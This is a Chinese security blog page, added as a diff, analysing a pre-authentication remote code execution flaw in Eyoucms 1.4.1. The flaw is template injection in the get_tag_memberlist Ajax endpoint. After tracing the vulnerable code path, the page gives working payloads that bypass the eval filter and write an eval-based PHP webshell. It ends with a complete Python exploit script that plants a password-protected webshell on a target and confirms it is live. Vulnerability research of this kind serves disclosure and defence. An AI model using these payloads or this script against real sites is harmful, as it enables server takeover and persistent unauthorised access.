@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Eyoucms 1.4.1 前台rce一、漏洞简介二、漏洞影响Eyoucms 1.4.1 三、复现过程漏洞分析进入&#x2F;application&#x2F;api&#x2F;controller&#x2F;Ajax.php中的**function get_tag_memberlist**方法 public function get_tag_memberlist() &amp;#123;     if (IS_AJAX_POST) &amp;#123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.1%20%E5%89%8D%E5%8F%B0rce/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Eyoucms 1.4.1 前台rce一、漏洞简介二、漏洞影响Eyoucms 1.4.1 三、复现过程漏洞分析进入&#x2F;application&#x2F;api&#x2F;controller&#x2F;Ajax.php中的**function get_tag_memberlist**方法 public function get_tag_memberlist() &amp;#123;     if (IS_AJAX_POST) &amp;#123">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Eyoucms1.4.1%E5%89%8D%E5%8F%B0rce/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Eyoucms1.4.1%E5%89%8D%E5%8F%B0rce/media/rId27.png">
+<meta property="article:published_time" content="2022-07-08T06:25:55.958Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Eyoucms1.4.1%E5%89%8D%E5%8F%B0rce/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Eyoucms/Eyoucms 1.4.1 前台rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.1%20%E5%89%8D%E5%8F%B0rce/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.958Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-4-1-前台rce"><a href="#Eyoucms-1-4-1-前台rce" class="headerlink" title="Eyoucms 1.4.1 前台rce"></a>Eyoucms 1.4.1 前台rce</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Eyoucms 1.4.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>进入<code>/application/api/controller/Ajax.php</code>中的**<code>function get_tag_memberlist</code>**方法</p>
+<pre><code>public function get_tag_memberlist()
+&#123;
+    if (IS_AJAX_POST) &#123;
+        $htmlcode = input(&#39;post.htmlcode/s&#39;);
+        $htmlcode = htmlspecialchars_decode($htmlcode);
+
+        $attarray = input(&#39;post.attarray/s&#39;);
+        $attarray = htmlspecialchars_decode($attarray);
+        $attarray = json_decode(base64_decode($attarray));
+
+        /*拼接完整的memberlist标签语法*/
+        $innertext = &quot;&#123;eyou:memberlist&quot;;
+        foreach ($attarray as $key =&gt; $val) &#123;
+            if (in_array($key, [&#39;js&#39;])) &#123;
+                continue;
+            &#125;
+            $innertext .= &quot; &#123;$key&#125;=&#39;&#123;$val&#125;&#39;&quot;;
+        &#125;
+        $innertext .= &quot; js=&#39;on&#39;&#125;&quot;;
+        $innertext .= $htmlcode;
+        $innertext .= &quot;&#123;/eyou:memberlist&#125;&quot;;
+        /*--end*/
+        $msg = $this-&gt;display($innertext); // 渲染模板标签语法
+        $data[&#39;msg&#39;] = $msg;
+        $this-&gt;success(&#39;读取成功！&#39;, null, $data);
+    &#125;
+    $this-&gt;error(&#39;加载失败！&#39;);
+&#125;
+</code></pre>
+<p>3 Line: 判断是否AJAX请求4 Line: 从post获取用户输入参数htmlcode的值并将结果赋值给$htmlcode5 Line: 将$htmlcode中的实体字符转换为正常字符7 Line: 从post获取用户输入参数attarray的值并将结果赋值给$attarray8 Line: 将$attarray中的实体字符转换为正常字符9 Line: 将$attarray进行base64解码再json解码12 Line: 定义标签13~18 Line:<br>使用foreach将$attay以键值对的方式遍历出来，判断每一个元素是否为js如果是那么直接进入下一次循环，否则”{$key}=’{$val}’”连接到标签后面19 Line: 闭合第一个标签20 Line: 将$htmlcode拼接到标签后，作为内容使用21 Line: 将闭合标签拼接到$innertext中23 Line: 调用基类中的display方法并将$innertext传入</p>
+<p>跟踪到<code>/core/library/think/Controll.php</code>文件中的**<code>display</code>**方法</p>
+<pre><code>protected function display($content = &#39;&#39;, $vars = [], $replace = [], $config = [])
+&#123;
+    return $this-&gt;view-&gt;display($content, $vars, $replace, $config);
+&#125;
+</code></pre>
+<p>3 Line:<br>调用视图类中的display方法，并将$content、$vars、$replace、$config传入</p>
+<p>跟踪到<code>/core/library/think/View.php</code>文件中的**<code>display</code>**方法</p>
+<pre><code>public function display($content, $vars = [], $replace = [], $config = [])
+&#123;
+    return $this-&gt;fetch($content, $vars, $replace, $config, true);
+&#125;
+</code></pre>
+<p>3 Line:<br>调用当前类中的fetch方法并将并将$content、$vars、$replace、$config传入</p>
+<p>跟踪到<code>/core/library/think/View.php</code>文件中的**<code>fetch</code>**方法</p>
+<pre><code>public function fetch($template = &#39;&#39;, $vars = [], $replace = [], $config = [], $renderContent = false)
+&#123;
+    // 模板变量
+    $vars = array_merge(self::$var, $this-&gt;data, $vars);
+
+    // 页面缓存
+    ob_start();
+    ob_implicit_flush(0);
+    // 渲染输出
+    try &#123;
+        $method = $renderContent ? &#39;display&#39; : &#39;fetch&#39;;
+        // 允许用户自定义模板的字符串替换
+        // $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;));
+        $replace = array_merge($this-&gt;replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;), $replace); // 解决一个页面上调用多个钩子的冲突问题 by 小虎哥
+        /*插件模板字符串替换，不能放在构造函数，毕竟构造函数只执行一次 by 小虎哥*/
+        // if ($this-&gt;__isset(&#39;weappInfo&#39;)) &#123;
+        //     $weappInfo = $this-&gt;__get(&#39;weappInfo&#39;);
+        //     if (!empty($weappInfo[&#39;code&#39;])) &#123;
+        //         $replace[&#39;__WEAPP_TEMPLATE__&#39;] = ROOT_DIR.&#39;/&#39;.WEAPP_DIR_NAME.&#39;/&#39;.$weappInfo[&#39;code&#39;].&#39;/template&#39;;
+        //     &#125;
+        // &#125;
+        /*--end*/
+        $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;, $replace);
+        $this-&gt;engine-&gt;$method($template, $vars, $config);
+    &#125; catch (\Exception $e) &#123;
+        ob_end_clean();
+        throw $e;
+    &#125;
+
+    // 获取并清空缓存
+    $content = ob_get_clean();
+    // 内容过滤标签
+    Hook::listen(&#39;view_filter&#39;, $content);
+
+    // $this-&gt;checkcopyr($content);
+
+    return $content;
+&#125;
+</code></pre>
+<p>4 Line:<br>将当前类中的成员属性$var、$data以及传入的$vars合并为一个数组并赋给$vars7~8 Line: 开启页面缓存11 Line:<br>使用三元运算符判断外部传入的$renderContent是否为真，若为真那么将display赋值给$method，否则将fetch赋值给$method24 Line: 调用Think类中的$method方法并将$template、$vars、$config传入</p>
+<p>跟踪到<code>/core/library/think/view/driver/Think.php</code>中的**<code>display</code>**方法</p>
+<pre><code>public function display($template, $data = [], $config = [])
+&#123;
+    $this-&gt;template-&gt;display($template, $data, $config);
+&#125;
+</code></pre>
+<p>3 Line: 调用模板类中的display方法并将$template、$data、$config传入</p>
+<p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>display</code>**方法</p>
+<pre><code>public function display($content, $vars = [], $config = [])
+&#123;
+    if ($vars) &#123;
+        $this-&gt;data = $vars;
+    &#125;
+    if ($config) &#123;
+        $this-&gt;config($config);
+    &#125;
+    $cacheFile = $this-&gt;config[&#39;cache_path&#39;] . $this-&gt;config[&#39;cache_prefix&#39;] . md5($content) . &#39;.&#39; . ltrim($this-&gt;config[&#39;cache_suffix&#39;], &#39;.&#39;);
+    if (!$this-&gt;checkCache($cacheFile)) &#123;
+        // 缓存无效 模板编译
+        $this-&gt;compiler($content, $cacheFile);
+    &#125;
+    // 读取编译存储
+    $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);
+&#125;
+</code></pre>
+<p>3~5 Line:<br>判断外部传入的$vars是否有值，若有那么则将$vars赋值给当前类中的成员属性data中6~8 Line:<br>判断$config是否有值，若有那么将$config传入当前类中的config方法9 Line: 生成缓存文件名称赋值给$cacheFile10~13 Line:<br>判断是否没有$cacheFile这个缓存文件，为真则调用当前类中的compiler方法并且将$content及$cacheFile传入其中</p>
+<p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>compiler</code>**方法</p>
+<pre><code>private function compiler(&amp;$content, $cacheFile)
+&#123;
+    // 判断是否启用布局
+    if ($this-&gt;config[&#39;layout_on&#39;]) &#123;
+        if (false !== strpos($content, &#39;&#123;__NOLAYOUT__&#125;&#39;)) &#123;
+            // 可以单独定义不使用布局
+            $content = str_replace(&#39;&#123;__NOLAYOUT__&#125;&#39;, &#39;&#39;, $content);
+        &#125; else &#123;
+            // 读取布局模板
+            $layoutFile = $this-&gt;parseTemplateFile($this-&gt;config[&#39;layout_name&#39;]);
+            if (is_array($layoutFile)) &#123; // 引入模板的错误友好提示 by 小虎哥
+                $content = !empty($layoutFile[&#39;msg&#39;]) ? $layoutFile[&#39;msg&#39;] : $content;
+            &#125; else if ($layoutFile) &#123;
+                // 替换布局的主体内容
+                $content = str_replace($this-&gt;config[&#39;layout_item&#39;], $content, file_get_contents($layoutFile));
+            &#125;
+        &#125;
+    &#125; else &#123;
+        $content = str_replace(&#39;&#123;__NOLAYOUT__&#125;&#39;, &#39;&#39;, $content);
+    &#125;
+
+    // 模板解析
+    $this-&gt;parse($content);
+    if ($this-&gt;config[&#39;strip_space&#39;]) &#123;
+        /* 去除html空格与换行 */
+        $find    = [&#39;~&gt;\s+&lt;~&#39;, &#39;~&gt;(\s+\n|\r)~&#39;];
+        $replace = [&#39;&gt;&lt;&#39;, &#39;&gt;&#39;];
+        $content = preg_replace($find, $replace, $content);
+    &#125;
+    // 优化生成的php代码
+    $content = preg_replace(&#39;/\?&gt;\s*&lt;\?php\s(?!echo\b)/s&#39;, &#39;&#39;, $content);
+    // 模板过滤输出
+    $replace = $this-&gt;config[&#39;tpl_replace_string&#39;];
+    $content = str_replace(array_keys($replace), array_values($replace), $content);
+    // 添加安全代码及模板引用记录
+    $content = &#39;&lt;?php if (!defined(\&#39;THINK_PATH\&#39;)) exit(); /*&#39; . serialize($this-&gt;includeFile) . &#39;*/ ?&gt;&#39; . &quot;\n&quot; . $content;
+    // 编译存储
+    $this-&gt;storage-&gt;write($cacheFile, $content);
+    $this-&gt;includeFile = [];
+    return;
+&#125;
+</code></pre>
+<p>23 Line: 将外部传入的$content传到当前类中的parse（解析模板）方法中</p>
+<p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>parse</code>**方法</p>
+<pre><code>public function parse(&amp;$content)
+&#123;
+    // 内容为空不解析
+    if (empty($content)) &#123;
+        return;
+    &#125;
+    // 替换eyou:literal标签内容
+    $this-&gt;parseEyouLiteral($content);
+    // 替换literal标签内容
+    $this-&gt;parseLiteral($content);
+    // 解析继承
+    $this-&gt;parseExtend($content);
+    // 解析布局
+    $this-&gt;parseLayout($content);
+    // 检查eyou:include语法  by 小虎哥
+    $this-&gt;parseEyouInclude($content);
+    // 检查include语法
+    $this-&gt;parseInclude($content);
+    // 替换包含文件中literal标签内容
+    $this-&gt;parseLiteral($content);
+    // 替换包含文件中eyou:literal标签内容
+    $this-&gt;parseEyouLiteral($content);
+    // 检查PHP语法
+    $this-&gt;parsePhp($content);
+
+    // 获取需要引入的标签库列表
+    // 标签库只需要定义一次，允许引入多个一次
+    // 一般放在文件的最前面
+    // 格式：&lt;taglib name=&quot;html,mytag...&quot; /&gt;
+    // 当TAGLIB_LOAD配置为true时才会进行检测
+    if ($this-&gt;config[&#39;taglib_load&#39;]) &#123;
+        $tagLibs = $this-&gt;getIncludeTagLib($content);
+        if (!empty($tagLibs)) &#123;
+            // 对导入的TagLib进行解析
+            foreach ($tagLibs as $tagLibName) &#123;
+                $this-&gt;parseTagLib($tagLibName, $content);
+            &#125;
+        &#125;
+    &#125;
+    // 预先加载的标签库 无需在每个模板中使用taglib标签加载 但必须使用标签库XML前缀
+    if ($this-&gt;config[&#39;taglib_pre_load&#39;]) &#123;
+        $tagLibs = explode(&#39;,&#39;, $this-&gt;config[&#39;taglib_pre_load&#39;]);
+        foreach ($tagLibs as $tag) &#123;
+            $this-&gt;parseTagLib($tag, $content);
+        &#125;
+    &#125;
+    // 内置标签库 无需使用taglib标签导入就可以使用 并且不需使用标签库XML前缀
+    $tagLibs = explode(&#39;,&#39;, $this-&gt;config[&#39;taglib_build_in&#39;]);
+    foreach ($tagLibs as $tag) &#123;
+        $this-&gt;parseTagLib($tag, $content, true);
+    &#125;
+    // 解析普通模板标签 &#123;$tagName&#125;
+    $this-&gt;parseTag($content);
+
+    // 还原被替换的eyou:Literal标签
+    $this-&gt;parseEyouLiteral($content, true);
+
+    // 还原被替换的Literal标签
+    $this-&gt;parseLiteral($content, true);
+    return;
+&#125;
+</code></pre>
+<p>24 Line: 调用当前类中的parsePhp（解析php标签）方法并将$content传入</p>
+<p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>parsePhp</code>**方法</p>
+<pre><code>private function parsePhp(&amp;$content)
+&#123;
+    // 短标签的情况要将&lt;?标签用echo方式输出 否则无法正常输出xml标识
+    $content = preg_replace(&#39;/(&lt;\?(?!php|=|$))/i&#39;, &#39;&lt;?php echo \&#39;\\1\&#39;; ?&gt;&#39; . &quot;\n&quot;, $content);
+
+    // 过滤eval函数，防止被注入执行任意代码 by 小虎哥
+    $view_replace_str = config(&#39;view_replace_str&#39;);
+    if (isset($view_replace_str[&#39;__EVAL__&#39;])) &#123;
+        if (stristr($content, &#39;&#123;eyou:php&#125;&#39;)) &#123; // 针对&#123;eyou:php&#125;标签语法处理
+            preg_match_all(&#39;/&#123;eyou\:php&#125;.*&#123;\/eyou\:php&#125;/iUs&#39;, $content, $matchs);
+            $matchs = !empty($matchs[0]) ? $matchs[0] : [];
+            if (!empty($matchs)) &#123;
+                foreach($matchs as $key =&gt; $val)&#123;
+                    $valNew = preg_replace(&#39;/&#123;(\/)?eyou\:php&#125;/i&#39;, &#39;&#39;, $val);
+                    $valNew = preg_replace(&quot;/([\W]+)eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);
+                    $valNew = preg_replace(&quot;/^eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);
+                    $valNew = &quot;&#123;eyou:php&#125;&#123;$valNew&#125;&#123;/eyou:php&#125;&quot;;
+                    $content = str_ireplace($val, $valNew, $content);
+                &#125;
+            &#125;
+        &#125; else if (stristr($content, &#39;&#123;php&#125;&#39;)) &#123; // 针对&#123;php&#125;标签语法处理
+            preg_match_all(&#39;/&#123;php&#125;.*&#123;\/php&#125;/iUs&#39;, $content, $matchs);
+            $matchs = !empty($matchs[0]) ? $matchs[0] : [];
+            if (!empty($matchs)) &#123;
+                foreach($matchs as $key =&gt; $val)&#123;
+                    $valNew = preg_replace(&#39;/&#123;(\/)?php&#125;/i&#39;, &#39;&#39;, $val);
+                    $valNew = preg_replace(&quot;/([\W]+)eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);
+                    $valNew = preg_replace(&quot;/^eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);
+                    $valNew = &quot;&#123;php&#125;&#123;$valNew&#125;&#123;/php&#125;&quot;;
+                    $content = str_ireplace($val, $valNew, $content);
+                &#125;
+            &#125;
+        &#125; else if (false !== strpos($content, &#39;&lt;?php&#39;)) &#123; // 针对原生php语法处理
+            $content = preg_replace(&quot;/(@)?eval(\s*)\(/i&quot;, &#39;intval(&#39;, $content);
+            $this-&gt;config[&#39;tpl_deny_php&#39;] &amp;&amp; $content = preg_replace(&quot;/\?\bphp\b/i&quot;, &quot;？ｍｕｍａ&quot;, $content);
+        &#125;
+    &#125;
+    // end
+
+    // PHP语法检查
+    if ($this-&gt;config[&#39;tpl_deny_php&#39;] &amp;&amp; false !== strpos($content, &#39;&lt;?php&#39;)) &#123;
+        if (config(&#39;app_debug&#39;)) &#123; // 调试模式下中断模板渲染 by 小虎哥
+            throw new Exception(&#39;not allow php tag&#39;, 11600);
+        &#125; else &#123; // 运营模式下继续模板渲染 by 小虎哥
+            echo(lang(&#39;not allow php tag&#39;));
+        &#125;
+    &#125;
+    return;
+&#125;
+</code></pre>
+<p>4 Line: 将模板中php短标签转换为21 Line: 判断传入的$content中是否包含了{php}22 Line:<br>使用正则表达式匹配出$content中所有包含了”{php}任意内容{/php}”的标签23 Line:<br>使用三目运算符判断匹配出来的数组中的第0个元素是否有值，如果有值那么将第0个元素的值赋给$matchs否则将空数组赋给$matchs24 Line: 判断$matchs不为空25 Line: 将$matchs使用foreach循环遍历26 Line: 将$val中的”{/任意空白字符php}”替换为空并赋给$valnew27 Line: 将$valnew中的”多个或零个0-9A-Za-Z_eval(“替换为”intval(“28 Line: 将$valnew中的”开始为eval任意空白字符(“替换为”intval(“29 Line: 将字符串”{php}{$valNew}{/php}”赋给$valnew30 Line: 将$content中的$val替换为$valNew</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre><code>Payload:attarray=eyJ7cGhwfXBocGluZm8oKTt7XC9waHB9Ijoie3BocH1waHBpbmZvKCk7e1wvcGhwfSJ9&amp;html=&#123;php&#125;phpinfo();&#123;/php&#125;
+</code></pre>
+<p><img src="/resource/Eyoucms1.4.1%E5%89%8D%E5%8F%B0rce/media/rId26.png"></p>
+<p>Payload生成方式:</p>
+<pre><code>base64_encode(jsonstring)
+</code></pre>
+<p>eval会被替换成intval，所以我们采用base64加密写入webshell的方式php代码如下：</p>
+<pre><code>file_put_contents(&quot;./wait.php&quot;,base64_decode(&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==&quot;));
+</code></pre>
+<p>PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==内容：</p>
+<pre><code>&lt;?php eval($_REQUEST[“w”]);?&gt;
+</code></pre>
+<p>将php标签转换为json格式并加密：</p>
+<pre><code>print base64_encode(json_encode(array(&quot;&#123;php&#125;file_put_contents(&#39;./wait.php&#39;,base64_decode(\&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\&quot;));&#123;/php&#125;&quot;=&gt;&quot;&#123;php&#125;file_put_contents(&#39;./wait.php&#39;,base64_decode(\&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\&quot;));&#123;/php&#125;&quot;)));
+
+eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=
+</code></pre>
+<p>pyload:</p>
+<pre><code>attarray=eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=&amp;htmlcode=bb
+</code></pre>
+<p><img src="/resource/Eyoucms1.4.1%E5%89%8D%E5%8F%B0rce/media/rId27.png"></p>
+<p>htmlcode参数作为随机方式传递</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>silly@PenetrationOs:~#: python eyoucms-ssti.py -u http://192.168.1.106:8085/ -o abc
+
+[+] 正在请求目标地址:http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist
+[*] 目标地址http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist存活
+[+] 正在向目标地址http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist写入abc.php
+[*] 疑似成功写入Webshell
+[+] 正在探测Webshell(http://192.168.1.106:8085/abc.php)是否存活
+[*] Webshell(http://192.168.1.106:8085/abc.php)已存活
+[*] 密码：ceshi
+[*]
+python
+
+#!/usr/bin/python
+
+ -*- coding: UTF-8 -*-
+
+import requests
+
+import sys,getopt
+
+import json,base64
+
+import time
+
+
+
+class Eyoucms:
+
+    session = None
+
+    headers = None
+
+    password = &quot;ceshi&quot;
+
+    output = &quot;ceshi&quot;
+
+    requesturi = &quot;/?m=api&amp;c=ajax&amp;a=get_tag_memberlist&quot;
+
+
+
+    def __init__(self,headers):
+
+        self.headers = headers
+
+        self.getparam(sys.argv[1:])
+
+        self.requestsdata = &#123;
+
+            &quot;attarray&quot;:self.createpyload(),
+
+            &quot;htmlcode&quot;:time.time()
+
+        &#125;
+
+        self.run()
+
+
+
+    def getparam(self,argv):
+
+        try:
+
+            options, args = getopt.getopt(argv, &quot;h:u:p:o:&quot;, [&quot;help&quot;, &quot;url=&quot;,&quot;password=&quot;,&quot;output=&quot;])
+
+        except getopt.GetoptError:
+
+            print &#39;eyoucms-ssti.py -u url -p password -o outputfile&#39;
+
+            return
+
+        for option, value in options:
+
+            if option in (&quot;-h&quot;, &quot;--help&quot;):
+
+                print &#39;eyoucms-ssti.py -u url&#39;
+
+            if option in (&quot;-u&quot;, &quot;--url&quot;):
+
+                if(self.request(value).status_code != 404):
+
+                    self.url = value
+
+            if option in (&quot;-p&quot;, &quot;--password&quot;):
+
+                    if(value != None):
+
+                        self.password = value
+
+                    else:
+
+                        self.password = &quot;ceshi&quot;
+
+            if option in (&quot;-o&quot;, &quot;--output&quot;):
+
+                    if(value != None):
+
+                        self.output = value.replace(&quot;.php&quot;,&quot;&quot;)
+
+                    else:
+
+                        self.output = &quot;ceshi&quot;
+
+
+
+    def run(self):
+
+        url = self.url.rstrip(&#39;/&#39;)+self.requesturi
+
+        print &quot;[+] 正在请求目标地址:%s&quot;%(url)
+
+        if(self.request(url).status_code == 200):
+
+            print &quot;
+ 目标地址%s存活&quot;%url
+
+        else:
+
+            print &quot;[-] 目标地址%s探测失败&quot;%url
+
+            return
+
+        print &quot;[+] 正在向目标地址%s写入%s.php&quot;%(url,self.output)
+
+        if(self.request(url,&quot;post&quot;).status_code == 200):
+
+            print &quot;
+ 疑似成功写入Webshell&quot;
+
+        shell = self.url.rstrip(&#39;/&#39;)+&quot;/%s.php&quot;%self.output
+
+        print &quot;[+] 正在探测Webshell(%s)是否存活&quot;%(shell)
+
+        if(self.request(shell).status_code == 200):
+
+            print &quot;
+ Webshell(%s)已存活\n
+ 密码：%s&quot;%(shell,self.password)
+
+
+
+
+
+    def createpyload(self):
+
+        short = base64.b64encode(&quot;&lt;php eval($_REQUEST[%s]);?&gt;&quot;%self.password)
+
+        file = self.output
+
+        payload = &#123;
+
+            &quot;&#123;php&#125;1&#123;/php&#125;&quot;:&quot;&#123;php&#125;file_put_contents(&#39;./%s.php&#39;,base64_decode(&#39;%s&#39;));&#123;/php&#125;&quot;%(file,short)
+
+        &#125;
+
+        return base64.b64encode(json.dumps(payload))
+
+
+
+    def request(self,url,method=&quot;get&quot;):
+
+        respone = None
+
+        if(not self.session):
+
+            self.session = requests.Session()
+
+        if(method == &quot;get&quot;):
+
+            try:
+
+                respone = self.session.get(url=url,headers=self.headers)
+
+            except requests.exceptions.ConnectTimeout:
+
+                print &quot;[-] 请求%s超时&quot;%url
+
+                return
+
+            except requests.exceptions.ConnectionError:
+
+                print &quot;[-] 请求%s无效&quot;%url
+
+                return
+
+            return respone
+
+        elif(method == &quot;post&quot;):
+
+            try:
+
+                respone = self.session.post(url=url,data=self.requestsdata,headers=self.headers)
+
+            except requests.exceptions.ConnectTimeout:
+
+                print &quot;[-] 请求%s超时&quot;%url
+
+                return
+
+            except requests.exceptions.ConnectionError:
+
+                print &quot;[-] 请求%s无效&quot;%url
+
+                return
+
+        return respone
+
+
+
+if __name__ == &quot;__main__&quot;:
+
+    
+
+    headers = &#123;
+
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;,
+
+        &quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;
+
+    &#125;
+
+    Eyoucms(headers)
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-56458-1-1.html">https://bbs.ichunqiu.com/thread-56458-1-1.html</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.1%20%E5%89%8D%E5%8F%B0rce/" data-id="cl5c2qoo5006ry8v1a9im4g0i" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.2%20sql%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.3.9%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
